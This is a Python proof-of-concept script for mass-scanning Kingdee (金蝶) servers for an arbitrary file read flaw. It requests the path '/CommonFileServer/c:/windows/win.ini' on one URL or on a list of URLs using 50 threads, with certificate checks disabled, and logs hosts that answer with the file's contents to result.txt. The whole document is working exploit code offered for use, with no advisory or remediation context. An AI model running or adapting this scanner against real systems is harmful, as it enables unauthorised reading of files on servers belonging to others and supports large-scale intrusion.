import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """    _____ __                              __
   / __(_) /__       ________  ____ _____/ /
  / /_/ / / _ \     / ___/ _ \/ __ `/ __  / 
 / __/ / /  __/    / /  /  __/ /_/ / /_/ /  
/_/ /_/_/\___/____/_/   \___/\__,_/\__,_/   
            /_____/                         """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='金蝶任意文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload1 = '/CommonFileServer/c:/windows/win.ini'
    headers = {
        'accept':'*/*',
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/119.0.0.0Safari/537.36',
        'Accept-Encoding':'gzip,deflate',
        'Accept-Language':'zh-CN,zh;q=0.9'


    }
    res1 = requests.get(url=target+payload1,headers=headers,verify=False,timeout=5)
    if 'fonts' in res1.text:
        print(f'[+]{target}')
        with open('result.txt','a',encoding='utf-8') as fp:
            fp.write(target+'\n')

if __name__ == '__main__':
    main()